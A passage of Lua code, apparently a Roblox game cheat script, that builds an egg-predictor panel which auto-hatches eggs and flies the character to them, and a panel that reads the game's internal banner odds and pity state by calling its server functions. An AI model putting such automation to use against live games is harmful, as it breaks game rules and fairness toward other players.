				local eggState = tbl.EggState
				if type(eggState) == "table" and type(eggState.WearEggTool) == "function" and pcall(eggState.WearEggTool, str) then
					return
				end
				local rfEggWorldAskWearTool = networking:FindFirstChild("RF/EggWorld/AskWearTool")

				if rfEggWorldAskWearTool and rfEggWorldAskWearTool:IsA("RemoteFunction") then
					pcall(rfEggWorldAskWearTool.InvokeServer, rfEggWorldAskWearTool, str)
				end

				return
			end

			if focus.Status == "Ready" then
				if not tbl19.Hatching then
					tbl19.Hatching = true
					pcall(fn38, str)
					tbl19.Hatching = false
				end

				return
			end

			if tbl19.Flying or type(tbl4.FlyTo) ~= "function" then
				return
			end
			local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
			local v21 = nil

			if placedEggRenders then
				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, str, 1, true) or child:GetAttribute("Uid") == str then
						v21 = child
						break
					end
				end
			end

			if not v21 then
				return
			end

			local ok, result = pcall(function()
				return v21:IsA("Model") and v21:GetPivot() or v21.CFrame
			end)

			if not ok then
				return
			end
			local movement = tbl4.Movement
			if movement.Owner ~= nil and movement.Owner ~= "treadmill" or movement.PlaceWanted or tbl4.Steal.Active or tbl4.Steal.Wanted or tbl4.Steal.Carrying then
				return
			end
			tbl19.Flying = true

			if tbl4.ClaimMovement("predictor") then
				if tbl4.Treadmill.Riding or tbl4.OnBelt() then
					pcall(tbl4.ExitBelt)
				end

				pcall(tbl4.FlyTo, result.Position + Vector3.new(0, 3, 0), function()
					return false
				end, "fly")

				tbl4.ReleaseMovement("predictor")
			end

			tbl19.Flying = false
		end

		local function fn39(arg)
			v19 = arg
			arg:SetDock(5, { Gap = n38, DividerColor = Color3.fromRGB(170, 174, 184) })
			local v21 = arg:Dock()

			tbl19.Icon = arg:Image({
				Parent = v21,
				X = 0,
				Y = 0,
				Width = n28,
				Height = n28,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.26,
				StrokeThickness = n17,
				StrokeTransparency = 0,
				ZIndex = 8,
			})

			tbl19.Name = arg:Text({
				Parent = v21,
				X = n29,
				Y = 0,
				Height = n30,
				Scale = n31,
				Wrap = false,
				Gradient = tbl6.NameGradient,
				TextStrokeTransparency = 1,
				ZIndex = 9,
			})

			tbl19.Rarity = arg:Text({
				Parent = v21,
				X = n29,
				Y = 0,
				Height = n30,
				Scale = n32,
				Wrap = false,
				Font = tbl6.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				ZIndex = 9,
			})

			tbl19.Info = arg:Text({ Parent = v21, X = n29, Y = n30, Height = n28 - n30, Wrap = false, ZIndex = 9 })

			tbl19.Action = arg:Button({
				Parent = v21,
				X = 0,
				Y = 0,
				Width = 5,
				Height = n30 - 0.1,
				Text = "",
				Scale = 1,
				Background = "#000000",
				BackgroundTransparency = 0.55,
				HoverTransparency = 0.3,
				PressTransparency = 0.15,
				Corner = 0.35,
				StrokeColor = Color3.fromRGB(255, 255, 255),
				StrokeThickness = n17,
				StrokeTransparency = 0.6,
				Visible = false,
				ZIndex = 10,
				Callback = function()
					if type(tbl19.RunAction) == "function" then
						task.spawn(tbl19.RunAction)
					end
				end,
			})

			arg:OnResize(function(arg2, arg3, arg4)
				if arg3 == n26 and arg4 == n27 then
					return
				end
				n26 = arg3
				n27 = arg4
				n18 = arg3 / math.max(arg4, 1)
				n19 = arg4
				n24 = 2
				n20 = 0.9 / math.max(arg:TextSize(), 1)
				tbl19.Rarity.Set({ StrokeThickness = n20 })

				for _, v22 in ipairs(tbl20) do
					v22.Rarity.Set({ StrokeThickness = n20 })
				end
			end)

			for _, v22 in ipairs({ "Icon", "Name", "Rarity", "Info", "Action" }) do
				fn24(tbl19[v22])
			end
		end

		local function fn40(arg)
			local v21 = tbl21[arg]

			if not v21 then
				v21 = v19:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
				tbl21[arg] = fn24(v21)
			end

			return v21
		end

		local function fn41(arg)
			local v21 = tbl20[arg]
			if v21 then
				return v21
			end
			local tbl23 = {}

			tbl23.Frame = v19:Button({
				Name = "Entry",
				Text = "",
				Background = "#000000",
				BackgroundTransparency = 0.74,
				HoverTransparency = 0.46,
				PressTransparency = 0.3,
				Corner = 0.35,
				X = 0,
				Y = 0,
				Width = 1,
				Height = 1,
				Visible = false,
				Callback = function()
					if tbl23.Id ~= nil then
						id = tbl23.Id
						requestEggRefresh()
					end
				end,
			})

			tbl23.Icon = v19:Image({
				Parent = tbl23.Frame,
				X = n34,
				Y = 0,
				Width = n33,
				Height = n33,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.45,
				StrokeThickness = n17,
				StrokeTransparency = 0,
			})

			tbl23.Name = v19:Text({
				Parent = tbl23.Frame,
				X = n34 + n36,
				Y = 0,
				Width = 1,
				Height = n30,
				Scale = n31,
				Wrap = false,
				Gradient = tbl6.NameGradient,
				TextStrokeTransparency = 1,
			})

			tbl23.Rarity = v19:Text({
				Parent = tbl23.Frame,
				X = n34 + n36,
				Y = 0,
				Width = 1,
				Height = n30,
				Scale = n32,
				Wrap = false,
				Font = tbl6.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				StrokeThickness = n20,
			})

			tbl23.Detail = v19:Text({
				Parent = tbl23.Frame,
				X = n34 + n36,
				Y = n30,
				Width = math.max(1, n18 - n36 - n34 * 2),
				Height = 1,
				Wrap = true,
			})

			tbl23.Status = v19:Text({ Parent = tbl23.Frame, X = 0, Y = 0, Width = 1, Height = n30, Wrap = false, Align = "Right" })

			for _, v22 in ipairs({ "Frame", "Icon", "Name", "Rarity", "Detail", "Status" }) do
				fn24(tbl23[v22])
			end

			tbl20[arg] = tbl23
			return tbl23
		end

		local function fn42(arg)
			local tbl23 = { Ready = 0, Growing = 0, Inventory = 0 }
			local n39 = 0
			local v21 = nil

			for _, v22 in ipairs(arg) do
				local status = v22.Status
				tbl23[status] = tbl23[status] + 1
				n39 += v22.Income

				if not v21 or v22.Income > v21.Income then
					v21 = v22
				end
			end

			return bold(paint(color3.Text, tostring(#arg) .. " eggs")) .. tbl6.Separator() .. bold(paint(color3.Ready, tbl23.Ready .. " ready")) .. tbl6.Separator() .. bold(paint(color3.Growing, tbl23.Growing .. " growing")) .. tbl6.Separator() .. bold(paint(color3.Inventory, tbl23.Inventory .. " in bag")) .. tbl6.Separator() .. paint(color3.Text, "Total") .. " " .. bold(paint(color3.Income, tbl6.FormatRate(n39))), v21
		end

		local function fn43(arg, arg2)
			if arg2 == "" then
				return true
			end
			local str = " " .. arg.Status
			local v21 = string.lower(tostring(arg.Info.Name) .. " " .. tostring(arg.Info.Rarity) .. str)

			for _, mutation in ipairs(arg.Mutations) do
				v21 ..= " " .. string.lower(tostring(mutation))
			end

			return string.find(v21, arg2, 1, true) ~= nil
		end

		local function fn44(arg)
			local tbl23 = {}
			local v21 = bold(paint(color3.Income, tbl6.FormatRate(arg.Income)))
			local str = paint(color3.Scale, string.format("%.2fx", arg.Scale)) .. tbl6.Separator() .. paint(color3.Weight, tbl6.FormatWeight(arg.Weight))
			tbl23[1] = v21
			tbl23[2] = str

			do
				local values = table.pack(fn30(arg))
				table.move(values, 1, values.n, 3, tbl23)
			end

			local v22 = tbl6.MutationText(arg.Mutations)
			table.insert(tbl23, v22 ~= "" and v22 or paint(color3.Hint, "Tap an egg below to preview it"))
			return table.concat(tbl23, "\n")
		end

		local function fn45(arg)
			local flag11 = tbl18.Spotlight and arg ~= nil

			if v20 ~= flag11 then
				v20 = flag11
				v19:SetDock(flag11 and 5 or 0, { Gap = n38 })
			end

			tbl19.Icon.Set({ Visible = flag11 })
			tbl19.Name.Set({ Visible = flag11 })
			tbl19.Rarity.Set({ Visible = flag11 })
			tbl19.Info.Set({ Visible = flag11 })
			tbl19.Action.Set({ Visible = flag11 })
			tbl19.Focus = flag11 and arg or nil
			if not flag11 then
				return
			end
			local info = arg.Info

			tbl19.Action.Set({
				Text = arg.Status == "Inventory" and bold(paint(color3.Inventory, "Hold egg")) or arg.Status == "Ready" and bold(paint(color3.Ready, "Hatch egg")) or bold(paint(color3.Growing, "Fly to egg")),
			})

			tbl19.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
			tbl19.Name.Set({ Text = tbl6.Escape(info.Name) })

			tbl19.Rarity.Set({
				Text = string.upper(tostring(info.Rarity)),
				Color = fn33(info),
				Gradient = fn32(info),
				GradientRotation = fn34(info),
			})

			tbl19.Info.Set({ Text = fn44(arg) })
		end

		local function fn46(arg, arg2)
			local info = arg2.Info
			arg.Id = arg2.Id
			arg.Frame.Set({ Visible = true, BackgroundTransparency = arg2.Id == id and 0.12 or 0.74 })
			arg.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
			arg.Name.Set({ Text = tbl6.Escape(info.Name) })

			arg.Rarity.Set({
				Text = string.upper(tostring(info.Rarity)),
				Color = fn33(info),
				Gradient = fn32(info),
				GradientRotation = fn34(info),
			})

			arg.Detail.Set({ Text = fn31(arg2) })
			arg.Status.Set({ Text = fn30(arg2) })
		end

		local function fn47()
			if n18 <= 0 then
				return
			end
			flag8 = false
			local n39 = math.max(1, n18 - n29)
			local v21 = fn36(tbl19.Action)

			if v21 then
				tbl19.ActionUnits = v21 + 1.4
			else
				flag8 = true
			end

			local n40 = math.min(tbl19.ActionUnits or 5, n39 * 0.45)
			local n41 = math.max(1, n39 - n40 - n37)
			tbl19.Action.Set({ X = n18 - n40, Y = 0.05, Width = n40, Height = n30 - 0.1 })
			local v22 = fn36(tbl19.Rarity)

			if v22 then
				n23 = v22 + 0.1
			else
				flag8 = true
			end

			local v23 = fn36(tbl19.Name)

			if v23 then
				n22 = math.min(v23 + 0.1, math.max(1, n41 - n23 - n37))
			else
				flag8 = true
			end

			tbl19.Name.Set({ X = n29, Y = 0, Width = n22, Height = n30 })

			tbl19.Rarity.Set({
				X = n29 + n22 + n37,
				Y = 0,
				Width = math.max(0.5, math.min(n23, n41 - n22 - n37)),
				Height = n30,
			})

			tbl19.Info.Set({ X = n29, Y = n30, Width = n39, Height = math.max(1, n28 - n30) })
			local n42 = math.max(1, n18 - n36 - n34 * 2)
			local n43 = 0

			for _, v24 in ipairs(tbl22) do
				if v24.Kind == "text" then
					local handle = v24.Handle
					local v25 = fn37(handle, n18)

					if v25 then
						v24.Height = v25
					else
						flag8 = true
					end

					local n44 = math.max(1, v24.Height or 1)
					handle.Set({ X = 0, Y = n43 + (v24.Gap and 0.5 or 0), Width = n18, Height = n44 })
					n43 += n44 + n38 * 0.5 + (v24.Gap and 0.5 or 0)
				else
					local item = v24.Item
					local v25 = fn37(item.Detail, n42)

					if v25 then
						item.DetailUnits = v25
					else
						flag8 = true
					end

					local n44 = math.clamp(item.DetailUnits or 1, 1, 4)
					local v26 = fn36(item.Status)

					if v26 then
						item.StatusUnits = v26 + 0.23
					else
						flag8 = true
					end

					local n45 = math.min(n42 * 0.42, math.max(2.73, item.StatusUnits or 2.73))
					local n46 = math.max(1, n42 - n45 - n37)
					local v27 = fn36(item.Rarity)

					if v27 then
						item.RarityUnits = v27 + 0.1
					else
						flag8 = true
					end

					local n47 = math.min(item.RarityUnits or 3, n46 * 0.5)
					local v28 = fn36(item.Name)

					if v28 then
						item.NameUnits = v28 + 0.1
					else
						flag8 = true
					end

					local min = math.min
					local max = math.max
					local nameUnits = item.NameUnits or 4
					local max2 = math.max
					local n48 = n46 - n47 - n37
					local v29 = min(max(1, nameUnits), max2(1, n48))
					local n49 = n35 * 2
					local n50 = math.max(n44 + n30, 2.3) + n49
					local n51 = (n50 - n44 - n30) / 2
					item.Frame.Set({ X = 0, Y = n43, Width = n18, Height = n50 })
					item.Icon.Set({ Y = (n50 - n33) / 2 })
					item.Name.Set({ X = n34 + n36, Y = n51, Width = v29 })
					item.Rarity.Set({ X = n34 + n36 + v29 + n37, Y = n51, Width = math.max(0.5, n47) })
					item.Detail.Set({ X = n34 + n36, Y = n51 + n30, Width = n42, Height = n44 })

					item.Status.Set({
						Visible = v24.HasStatus,
						X = n34 + n36 + n42 - n45,
						Y = n51,
						Width = math.max(0.5, n45),
					})

					n43 += n50 + n38
				end
			end

			local n44 = math.max(1, n43)

			if math.abs(n44 - n21) > 0.01 then
				n21 = n44
				v19:SetContentLines(n44)
			end
		end

		local function fn48()
			if not v19 then
				return
			end
			n24 = 2
			local v21 = fn28()
			table.clear(tbl22)
			local n39 = 0

			local function fn49(arg, arg2)
				n39 += 1
				local v22 = fn40(n39)
				v22.Set({ Visible = true, Text = arg })
				table.insert(tbl22, { Kind = "text", Handle = v22, Gap = arg2 })
			end

			local n40

			if not v21 then
				fn45(nil)
				fn49(bold(paint(color3.Hint, "Egg data is not available yet")), false)
				n40 = 0
			else
				fn29(v21)
				local v22, v23 = fn42(v21)
				fn49(v22, false)
				local v24 = nil

				if id ~= nil then
					v24 = nil

					for _, v25 in ipairs(v21) do
						if v25.Id == id then
							v24 = v25
							break
						else
							v24 = nil
						end
					end
				end

				fn45(v24 or v23)
				local v25 = string.lower(v19:Query())
				local tbl23 = {}

				for _, v26 in ipairs(v21) do
					if fn43(v26, v25) then
						table.insert(tbl23, v26)
					end
				end

				if #tbl23 == 0 then
					fn49(paint(color3.Hint, #v21 == 0 and "No eggs yet" or string.format("No results for \"%s\"", tbl6.Escape(v25))), false)
					n40 = 0
				else
					n40 = 0

					for _, v26 in ipairs(tbl17) do
						local tbl24 = {}

						for _, v27 in ipairs(tbl23) do
							if v27.Status == v26.Key then
								table.insert(tbl24, v27)
							end
						end

						if #tbl24 > 0 then
							local flag11 = #tbl22 > 0
							fn49(string.format("<b><font color=\"%s\">%s</font></b> <font color=\"#AAAAAA\">(%d)</font>", v26.Color, v26.Title, #tbl24), flag11)

							for _, v27 in ipairs(tbl24) do
								n40 += 1
								local v28 = fn41(n40)
								fn46(v28, v27)
								table.insert(tbl22, { Kind = "item", Item = v28, HasStatus = true })
							end
						end
					end
				end
			end

			for i = n39 + 1, #tbl21 do
				tbl21[i].Set({ Visible = false })
			end

			for i = n40 + 1, #tbl20 do
				tbl20[i].Frame.Set({ Visible = false })
			end

			fn47()
			n24 = 2
		end

		tbl6.RequestEggRefresh = requestEggRefresh

		if not tbl6.Ready then
			v18:CreateText({
				Name = "Egg Predictor",
				Text = "Update the Chilli Library to use the predictor canvas.",
			})
		else
			v18:CreateDropdown({
				Name = "Sort By",
				Options = tbl16,
				Default = tbl16[1],
				Callback = function(sort)
					if table.find(tbl16, sort) then
						tbl18.Sort = sort
						requestEggRefresh()
					end
				end,
			})

			v18:CreateToggle({
				Name = "Preview Card",
				Default = true,
				Callback = function(arg)
					tbl18.Spotlight = arg == true
					requestEggRefresh()
				end,
			})

			local v21 = v18:CreateCanvas({
				Name = "Egg Predictor",
				Search = true,
				SearchPlaceholder = "Search eggs...",
				Layout = "free",
				Style = {
					TextScale = 0.84,
					LineHeight = 1.1,
					MinLines = 16,
					MaxLines = 32,
					BackgroundTransparency = 0.5,
					ScrollBarColor = Color3.fromRGB(170, 174, 184),
					TextColor = Color3.fromRGB(255, 255, 255),
					TextStrokeTransparency = 0.7,
				},
				Build = function(arg)
					fn39(arg)
					requestEggRefresh()
				end,
			})

			fn4(function()
				v21:Destroy()
			end)

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				local v22 = tbl6.PageVisible()
				local flag11 = v22 and (v19 == nil or tbl6.IsShown(v19:Root()))

				if flag11 and not flag10 then
					flag9 = true
				end

				flag10 = flag11
				if not v22 then
					return
				end
				n25 += deltaTime

				if flag11 and flag9 or n25 >= n16 then
					n25 = 0

					if flag11 then
						flag9 = false
						pcall(fn48)
					end

					if tbl6.RefreshFuse then
						pcall(tbl6.RefreshFuse)
					end
				end

				if flag11 and (n24 > 0 or flag8) then
					if n24 > 0 then
						n24 -= 1
					end

					pcall(fn47)
				end

				if tbl6.PlaceFuse then
					tbl6.PlaceFuse()
				end
			end)

			fn4(function()
				connection:Disconnect()
			end)
		end
	end
end

local fn8, v9

do
	local paint
	paint = tbl6.Paint
	local bold
	bold = tbl6.Bold
	local color2
	color2 = tbl6.Color
	local n3, v10, tbl7, tbl8, tbl9, tbl10, flag, n4, fn9, fn10
	local fn11, fn12

	do
		local n5 = 5
		local n6 = n5 + 0.8
		local n7 = 1.2
		local n8 = 1.2
		local n9 = 0.936
		local n10 = 2.3
		local n11 = 0.25
		local n12 = 0.18
		local n13 = n10 + 0.6
		local n14 = 0.24
		n3 = 0.22
		local n15 = 0.0909
		v10 = nil
		tbl7 = {}
		tbl8 = {}
		tbl9 = {}
		tbl10 = {}
		local n16 = 0
		local n17 = 0
		local n18 = 0.06
		local n19 = -1
		local n20 = -1
		local n21 = -1
		local n22 = 4
		local n23 = 3
		flag = false
		n4 = 0

		fn9 = function(arg)
			if string.upper(tostring(arg.Rarity)) == "SECRET" then
				return tbl6.SecretGradient
			end
			return arg.Gradient
		end

		fn10 = function(arg)
			return fn9(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
		end

		fn11 = function(arg)
			if string.upper(tostring(arg.Rarity)) == "SECRET" then
				return tbl6.SecretRotation
			end
			return nil
		end

		fn12 = function(arg)
			v10 = arg
			arg:SetDock(5, { Gap = n3, DividerColor = Color3.fromRGB(170, 174, 184) })
			local v11 = arg:Dock()

			tbl7.Icon = arg:Image({
				Parent = v11,
				X = 0,
				Y = 0,
				Width = n5,
				Height = n5,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.26,
				StrokeThickness = n15,
				StrokeTransparency = 0,
				ZIndex = 8,
			})

			tbl7.Name = arg:Text({
				Parent = v11,
				X = n6,
				Y = 0,
				Height = n7,
				Scale = n8,
				Wrap = false,
				Gradient = tbl6.NameGradient,
				TextStrokeTransparency = 1,
				ZIndex = 9,
			})

			tbl7.Rarity = arg:Text({
				Parent = v11,
				X = n6,
				Y = 0,
				Height = n7,
				Scale = n9,
				Wrap = false,
				Font = tbl6.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				ZIndex = 9,
			})

			tbl7.Info = arg:Text({ Parent = v11, X = n6, Y = n7, Height = n5 - n7, Wrap = false, ZIndex = 9 })

			arg:OnResize(function(arg2, arg3, arg4)
				if arg3 == n19 and arg4 == n20 then
					return
				end
				n19 = arg3
				n20 = arg4
				n16 = arg3 / math.max(arg4, 1)
				n17 = arg4
				n4 = 2
				n18 = 0.9 / math.max(arg:TextSize(), 1)
				tbl7.Rarity.Set({ StrokeThickness = n18 })

				for _, v12 in ipairs(tbl8) do
					v12.Rarity.Set({ StrokeThickness = n18 })
				end
			end)
		end

		local function fn13(arg)
			local v11 = arg and arg.Get()
			if not v11 or n17 <= 0 then
				return nil
			end

			if v11.Text ~= tostring(arg.Spec.Text or "") then
				return nil
			end
			return v11
		end

		local function fn14(arg)
			local v11 = fn13(arg)
			if not v11 then
				return nil
			end
			local size = v11.Size
			local textWrapped = v11.TextWrapped
			v11.TextWrapped = false
			v11.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
			local x = v11.TextBounds.X
			v11.Size = size
			v11.TextWrapped = textWrapped
			if x <= 0 then
				return nil
			end
			return x / n17
		end

		local function fn15(arg, arg2)
			local v11 = fn13(arg)
			if not v11 then
				return nil
			end
			local size = v11.Size
			v11.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n17 + 0.5)), 100000)
			local y = v11.TextBounds.Y
			v11.Size = size
			if y <= 0 then
				return nil
			end
			return y / n17
		end

		local function fn16(arg)
			local v11 = tbl9[arg]

			if not v11 then
				local v12 = v10:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
				tbl9[arg] = v12
				v11 = v12
			end

			return v11
		end

		local function fn17(arg)
			local v11 = tbl8[arg]
			if v11 then
				return v11
			end

			local tbl11 = {
				Frame = v10:Frame({
					Name = "Slot",
					Background = "#000000",
					BackgroundTransparency = 0.74,
					Corner = 0.35,
					X = 0,
					Y = 0,
					Width = 1,
					Height = 1,
					Visible = false,
				}),
			}

			tbl11.Icon = v10:Image({
				Parent = tbl11.Frame,
				X = n11,
				Y = 0,
				Width = n10,
				Height = n10,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.45,
				StrokeThickness = n15,
				StrokeTransparency = 0,
			})

			tbl11.Name = v10:Text({
				Parent = tbl11.Frame,
				X = n11 + n13,
				Y = 0,
				Width = 1,
				Height = n7,
				Scale = n8,
				Wrap = false,
				Gradient = tbl6.NameGradient,
				TextStrokeTransparency = 1,
			})

			tbl11.Rarity = v10:Text({
				Parent = tbl11.Frame,
				X = n11 + n13,
				Y = 0,
				Width = 1,
				Height = n7,
				Scale = n9,
				Wrap = false,
				Font = tbl6.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				StrokeThickness = n18,
			})

			tbl11.Detail = v10:Text({
				Parent = tbl11.Frame,
				X = n11 + n13,
				Y = n7,
				Width = math.max(1, n16 - n13 - n11 * 2),
				Height = 1,
				Wrap = true,
			})

			tbl11.Status = v10:Text({
				Parent = tbl11.Frame,
				X = 0,
				Y = 0,
				Width = 1,
				Height = n7,
				Wrap = false,
				Align = "Right",
				Color = color2.Hint,
			})

			tbl8[arg] = tbl11
			return tbl11
		end

		local function fn18()
			if n16 <= 0 then
				return
			end
			flag = false
			local n24 = math.max(1, n16 - n6)
			local v11 = fn14(tbl7.Rarity)

			if v11 then
				n23 = v11 + 0.1
			else
				flag = true
			end

			local v12 = fn14(tbl7.Name)

			if v12 then
				n22 = math.min(v12 + 0.1, math.max(1, n24 - n23 - n14))
			else
				flag = true
			end

			tbl7.Name.Set({ X = n6, Y = 0, Width = n22, Height = n7 })

			tbl7.Rarity.Set({
				X = n6 + n22 + n14,
				Y = 0,
				Width = math.max(0.5, math.min(n23, n24 - n22 - n14)),
				Height = n7,
			})

			tbl7.Info.Set({ X = n6, Y = n7, Width = n24, Height = math.max(1, n5 - n7) })
			local n25 = math.max(1, n16 - n13 - n11 * 2)
			local n26 = 0

			for _, v13 in ipairs(tbl10) do
				if v13.Kind == "text" then
					local handle = v13.Handle
					local v14 = fn15(handle, n16)

					if v14 then
						v13.Height = v14
					else
						flag = true
					end

					local n27 = math.max(1, v13.Height or 1)
					handle.Set({ X = 0, Y = n26 + (v13.Gap and 0.5 or 0), Width = n16, Height = n27 })
					n26 += n27 + n3 * 0.5 + (v13.Gap and 0.5 or 0)
				else
					local slot = v13.Slot
					local v14 = fn15(slot.Detail, n25)

					if v14 then
						slot.DetailUnits = v14
					else
						flag = true
					end

					local n27 = math.clamp(slot.DetailUnits or 1, 1, 4)
					local v15 = fn14(slot.Status)

					if v15 then
						slot.StatusUnits = v15 + 0.23
					else
						flag = true
					end

					local n28 = math.min(n25 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
					local n29 = math.max(1, n25 - n28 - n14)
					local v16 = fn14(slot.Rarity)

					if v16 then
						slot.RarityUnits = v16 + 0.1
					else
						flag = true
					end

					local n30 = math.min(slot.RarityUnits or 3, n29 * 0.5)
					local v17 = fn14(slot.Name)

					if v17 then
						slot.NameUnits = v17 + 0.1
					else
						flag = true
					end

					local min = math.min
					local max = math.max
					local nameUnits = slot.NameUnits or 4
					local max2 = math.max
					local n31 = n29 - n30 - n14
					local v18 = min(max(1, nameUnits), max2(1, n31))
					local n32 = n12 * 2
					local n33 = math.max(n27 + n7, 2.3) + n32
					local n34 = (n33 - n27 - n7) / 2
					slot.Frame.Set({ X = 0, Y = n26, Width = n16, Height = n33 })
					slot.Icon.Set({ Y = (n33 - n10) / 2 })
					slot.Name.Set({ X = n11 + n13, Y = n34, Width = v18 })
					slot.Rarity.Set({ X = n11 + n13 + v18 + n14, Y = n34, Width = math.max(0.5, n30) })
					slot.Detail.Set({ X = n11 + n13, Y = n34 + n7, Width = n25, Height = n27 })
					slot.Status.Set({ X = n11 + n13 + n25 - n28, Y = n34, Width = math.max(0.5, n28) })
					n26 += n33 + n3
				end
			end

			local n27 = math.max(1, n26)

			if math.abs(n27 - n21) > 0.01 then
				n21 = n27
				v10:SetContentLines(n27)
			end
		end

		local v11 = fn2(function()
			return ReplicatedStorage.Data.Rift
		end)

		local n24 = 30
		local tbl11 = { Verdant = "#6BFFB0", Umbral = "#C08BFF", Radiant = "#FFD34D" }
		local v12 = nil
		local flag2 = false
		local n25 = 0
		local tbl12 = { Banner = {}, Odds = {}, Chance = {}, Clears = 0 }

		local function fn19(arg)
			return tbl11[tostring(arg)] or color2.Text
		end

		local function fn20(arg, ...)
			if type(v11) ~= "table" or type(v11[arg]) ~= "function" then
				return nil
			end
			local ok, result = pcall(v11[arg], ...)
			if ok then
				return result
			end
			return nil
		end

		local function fn21(arg)
			return tostring(fn20("GetBannerDisplayName", arg) or arg)
		end

		local function fn22(arg)
			local v13 = tbl12.Banner[arg]

			if v13 == nil then
				local BannerIdForPeriod = fn20("BannerIdForPeriod", arg) or false
				tbl12.Banner[arg] = BannerIdForPeriod
				v13 = BannerIdForPeriod
			end

			return v13 or nil
		end

		local function fn23(arg)
			local v13, v14, v15 = ipairs(type(v11) == "table" and v11.Banners or {})
			local n26 = 0
			local n27 = 0

			for _, v16 in v13, v14, v15 do
				local n28 = tonumber(fn20("GetBannerWeight", v16.Id)) or 0
				n26 += n28

				if v16.Id == arg then
					n27 = n28
				end
			end

			return n26 > 0 and n27 / n26 * 100 or 0
		end

		local function fn24(arg)
			local v13 = tbl12.Chance[arg]

			if v13 == nil then
				v13 = fn23(arg)
				tbl12.Chance[arg] = v13
			end

			return v13
		end

		local function fn25(arg)
			local GetBanner = fn20("GetBanner", arg)
			local tbl13 = {}
			local v13 = ipairs
			local pets = type(GetBanner) == "table" and GetBanner.Pets or {}
			local n26 = 0

			for _, pet in v13(pets) do
				local n27 = tonumber(fn20("GetPetWeight", arg, pet.AssetId)) or 0

				if n27 > 0 then
					n26 += n27
					table.insert(tbl13, { AssetId = pet.AssetId, Weight = n27 })
				end
			end

			for _, v14 in ipairs(tbl13) do
				v14.Chance = n26 > 0 and v14.Weight / n26 * 100 or 0
			end

			table.sort(tbl13, function(arg2, arg3)
				return arg2.Chance > arg3.Chance
			end)

			return tbl13
		end

		local function fn26(arg)
			local v13 = tbl12.Odds[arg]

			if v13 == nil then
				v13 = fn25(arg)
				tbl12.Odds[arg] = v13
			end

			return v13
		end

		local function fn27(arg)
			local ok, result = pcall(os.date, "%I:%M %p", math.floor(arg))
			if not ok then
				return ""
			end
			return (string.gsub(tostring(result), "^0", ""))
		end

		local function fn28(arg)
			local n26 = math.max(0, math.floor(arg))
			local n27 = math.floor(n26 / 86400)
			local n28 = math.floor(n26 % 86400 / 3600)
			local n29 = math.floor(n26 % 3600 / 60)
			if n27 > 0 then
				return string.format("%dd %dh %02dm", n27, n28, n29)
			end
			return string.format("%dh %02dm", n28, n29)
		end

		local function fn29(arg)
			local income = arg >= 10 and color2.Income or arg >= 1 and color2.Clock or "#FF7A7A"
			local str = string.format(arg >= 1 and "%.1f%%" or "%.2f%%", arg)
			return bold(paint(income, str))
		end

		local function fn30(arg)
			if arg <= 0 then
				return ""
			end
			local n26 = 100 / arg
			return paint(color2.Hint, n26 < 10 and string.format("1 in %.1f", n26) or string.format("1 in %d", math.floor(n26 + 0.5)))
		end

		local function fn31()
			if flag2 or os.clock() < n25 then
				return
			end
			flag2 = true
			n25 = os.clock() + n24

			task.spawn(function()
				local rfRiftAskState = networking:FindFirstChild("RF/Rift/AskState")

				if rfRiftAskState and rfRiftAskState:IsA("RemoteFunction") then
					local ok, result = pcall(rfRiftAskState.InvokeServer, rfRiftAskState)

					if ok and type(result) == "table" then
						v12 = result
					end
				end

				flag2 = false
			end)
		end

		local function fn32(arg, arg2, arg3)
			local flag3 = arg ~= nil
			v10:SetDock(flag3 and 5 or 0, { Gap = n3 })
			tbl7.Icon.Set({ Visible = flag3 })
			tbl7.Name.Set({ Visible = flag3 })
			tbl7.Rarity.Set({ Visible = flag3 })
			tbl7.Info.Set({ Visible = flag3 })
			if not flag3 then
				return
			end
			local v13 = fn19(arg)
			local GetBannerEggIcon = fn20("GetBannerEggIcon", arg)

			tbl7.Icon.Set({
				Visible = type(GetBannerEggIcon) == "string" and GetBannerEggIcon ~= "",
				Image = type(GetBannerEggIcon) == "string" and GetBannerEggIcon or "",
				StrokeColor = Color3.fromHex(v13),
			})

			tbl7.Name.Set({ Text = tbl6.Escape(fn21(arg)) })
			tbl7.Rarity.Set({ Text = "ACTIVE", Color = Color3.fromHex(color2.Ready), Gradient = nil })
			local n26 = arg3 - arg2 % arg3
			local tbl13 = {}
			local str = bold(paint(color2.Clock, "Ends in " .. tbl6.FormatClock(n26))) .. tbl6.Separator() .. paint(color2.Text, fn27(arg2 + n26))
			local str2 = paint(color2.Hint, "Banner chance ") .. fn29(fn24(arg))
			tbl13[1] = str
			tbl13[2] = str2
			local v14 = v12

			if type(v14) == "table" and v14.BannerId == arg then
				if v14.Unlocked == false then
					table.insert(tbl13, paint("#FF7A7A", "Locked on this account"))
				else
					table.insert(tbl13, paint(color2.Hint, "Pity ") .. bold(paint(color2.Text, string.format("%s/%s", tostring(v14.PityCount or 0), tostring(v14.PityThreshold or 0)))) .. tbl6.Separator() .. paint(color2.Hint, "Free rerolls ") .. bold(paint(color2.Text, tostring(v14.FreeRefreshesRemaining or 0))))
				end
			end

			tbl7.Info.Set({ Text = table.concat(tbl13, "\n") })
		end

		local function fn33()
			if not v10 then
				return
			end
			n4 = 2
			table.clear(tbl10)
			local n26 = 0
			local n27 = 0

			local function fn34(arg, arg2)
				n26 += 1
				local v13 = fn16(n26)
